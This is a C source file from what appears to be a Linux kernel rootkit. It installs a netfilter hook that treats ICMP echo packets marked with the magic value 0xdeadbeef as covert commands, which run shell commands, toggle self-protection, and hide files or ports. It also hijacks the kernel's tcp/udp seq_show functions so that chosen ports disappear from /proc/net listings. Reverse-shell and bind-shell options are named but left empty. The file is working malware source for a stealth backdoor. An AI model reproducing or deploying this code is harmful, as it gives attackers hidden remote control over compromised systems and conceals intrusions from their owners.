#include "qrk_common.h"

#define MAX_LEN 512
struct magic_icmp
{
    unsigned int magic;
    unsigned int choice;
    char buffer[MAX_LEN];
};

struct nf_hook_ops pre_hook;
void do_choice(struct magic_icmp *stu);

// netfilter
unsigned int watch_icmp(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    struct iphdr *ip_header;
    struct icmphdr *icmp_header;
    struct magic_icmp *payload;
    unsigned int payload_size;

    ip_header = ip_hdr(skb);
    if (!ip_header)
        return NF_ACCEPT;

    if (ip_header->protocol != IPPROTO_ICMP)
        return NF_ACCEPT;

    // skb->transport_header hasn't been set by this point, so we have to calculate it manually
    icmp_header = (struct icmphdr *)(ip_header + 1);
    if (!icmp_header)
        return NF_ACCEPT;

    payload = (struct magic_icmp *)(icmp_header + 1);
    payload_size = skb->len - sizeof(struct iphdr) - sizeof(struct icmphdr);

    dbg("ICMP packet: payload_size=%u, magic=%x, choice=%d, buffer=%s\n", payload_size, payload->magic, payload->choice, payload->buffer);

    if (icmp_header->type != ICMP_ECHO || payload_size != sizeof(*payload) || payload->magic != 0xdeadbeef)
        return NF_ACCEPT;

    dbg("Received magic ICMP packet\n");
    do_choice(payload);
    return NF_STOLEN;
}

void do_choice(struct magic_icmp *stu)
{
    unsigned int choice;
    char buf[MAX_LEN];

    choice = stu->choice;
    memcpy(buf, stu->buffer, MAX_LEN);

    switch (choice)
    {
    case 0:
        dbg("case 0: do_exec_cmd");
        do_exec_cmd(buf);
        break;
    case 1:
        dbg("case 1: self_protect_on");
        self_protect_on();
        break;
    case 2:
        dbg("case 2: self_protect_off");
        self_protect_off();
        break;
    case 3:
        dbg("case 3: fs_hide_file");
        fs_hide_file(buf);
        break;
    case 4:
        dbg("case 4: fs_unhide_file");
        fs_unhide_file(buf);
        break;
    case 5:
        dbg("case 5: do_reverse_shell");
        break;
    case 6:
        dbg("case 6: do_bind_shell");
        break;
    case 7:
        dbg("hide_tcp4_port");
        hide_tcp4_port(*(unsigned short *)buf);
        break;
    case 8:
        dbg("unhide_tcp4_port");
        unhide_tcp4_port(*(unsigned short *)buf);
        break;
    case 9:
        dbg("hide_tcp6_port");
        hide_tcp6_port(*(unsigned short *)buf);
        break;
    case 10:
        dbg("unhide_tcp6_port");
        unhide_tcp6_port(*(unsigned short *)buf);
        break;
    case 11:
        dbg("hide_udp4_port");
        hide_udp4_port(*(unsigned short *)buf);
        break;
    case 12:
        dbg("unhide_udp4_port");
        unhide_udp4_port(*(unsigned short *)buf);
        break;
    case 13:
        dbg("hide_udp6_port");
        hide_udp6_port(*(unsigned short *)buf);
        break;
    case 14:
        dbg("unhide_udp6_port");
        unhide_udp6_port(*(unsigned short *)buf);
        break;
    default:
        dbg("qrk: do_choice(unk)");
        break;
    }
}

// tcp/udp hide
#define TMPSZ 150
struct hidden_port
{
    unsigned short port;
    struct list_head list;
};

LIST_HEAD(hidden_tcp4_ports);
LIST_HEAD(hidden_tcp6_ports);
LIST_HEAD(hidden_udp4_ports);
LIST_HEAD(hidden_udp6_ports);

static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
static int (*udp4_seq_show)(struct seq_file *seq, void *v);
static int (*udp6_seq_show)(struct seq_file *seq, void *v);

void hide_tcp4_port(unsigned short port)
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp)
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_tcp4_ports);
}

void unhide_tcp4_port(unsigned short port)
{
    struct hidden_port *hp;

    list_for_each_entry(hp, &hidden_tcp4_ports, list)
    {
        if (port == hp->port)
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_tcp6_port(unsigned short port)
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp)
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_tcp6_ports);
}

void unhide_tcp6_port(unsigned short port)
{
    struct hidden_port *hp;

    list_for_each_entry(hp, &hidden_tcp6_ports, list)
    {
        if (port == hp->port)
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_udp4_port(unsigned short port)
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp)
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_udp4_ports);
}

void unhide_udp4_port(unsigned short port)
{
    struct hidden_port *hp;

    list_for_each_entry(hp, &hidden_udp4_ports, list)
    {
        if (port == hp->port)
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_udp6_port(unsigned short port)
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp)
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_udp6_ports);
}

void unhide_udp6_port(unsigned short port)
{
    struct hidden_port *hp;

    list_for_each_entry(hp, &hidden_udp6_ports, list)
    {
        if (port == hp->port)
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

static int n_tcp4_seq_show(struct seq_file *seq, void *v)
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

    asm_hijack_pause(&n_tcp4_seq_show);
    ret = tcp4_seq_show(seq, v);
    asm_hijack_resume(&n_tcp4_seq_show);

    list_for_each_entry(hp, &hidden_tcp4_ports, list)
    {
        sprintf(port, ":%04X", hp->port);

        if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ))
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_tcp6_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    asm_hijack_pause(&n_tcp6_seq_show);
    ret = tcp6_seq_show(seq, v);
    asm_hijack_resume(&n_tcp6_seq_show);

    list_for_each_entry(hp, &hidden_tcp6_ports, list)
    {
        sprintf(port, ":%04X", hp->port);

        if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ))
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_udp4_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    asm_hijack_pause(&n_udp4_seq_show);
    ret = udp4_seq_show(seq, v);
    asm_hijack_resume(&n_udp4_seq_show);

    list_for_each_entry(hp, &hidden_udp4_ports, list)
    {
        sprintf(port, ":%04X", hp->port);

        if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ))
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_udp6_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    asm_hijack_pause(&n_udp6_seq_show);
    ret = udp6_seq_show(seq, v);
    asm_hijack_resume(&n_udp6_seq_show);

    list_for_each_entry(hp, &hidden_udp6_ports, list)
    {
        sprintf(port, ":%04X", hp->port);

        if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ))
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}
#undef TMPSZ

void icmp_init(void)
{
    dbg("Monitoring ICMP packets via netfilter\n");

    pre_hook.hook = watch_icmp;
    pre_hook.pf = PF_INET;
    pre_hook.priority = NF_IP_PRI_FIRST;
    pre_hook.hooknum = NF_INET_PRE_ROUTING;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
    nf_register_net_hook(&init_net, &pre_hook);
#else
    nf_register_hook(&pre_hook);
#endif

    tcp4_seq_show = (void *)get_symbol("tcp4_seq_show");
    asm_hijack_start(tcp4_seq_show, &n_tcp4_seq_show);

    tcp6_seq_show = (void *)get_symbol("tcp6_seq_show");
    asm_hijack_start(tcp6_seq_show, &n_tcp6_seq_show);

    udp4_seq_show = (void *)get_symbol("udp4_seq_show");
    asm_hijack_start(udp4_seq_show, &n_udp4_seq_show);

    udp6_seq_show = (void *)get_symbol("udp6_seq_show");
    asm_hijack_start(udp6_seq_show, &n_udp6_seq_show);
}

void icmp_exit(void)
{
    asm_hijack_stop(&n_tcp4_seq_show);
    asm_hijack_stop(&n_tcp6_seq_show);
    asm_hijack_stop(&n_udp4_seq_show);
    asm_hijack_stop(&n_udp6_seq_show);

    dbg("Stopping monitoring ICMP packets via netfilter\n");
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
    nf_unregister_net_hook(&init_net, &pre_hook);
#else
    nf_unregister_hook(&pre_hook);
#endif
}

#undef MAX_LEN
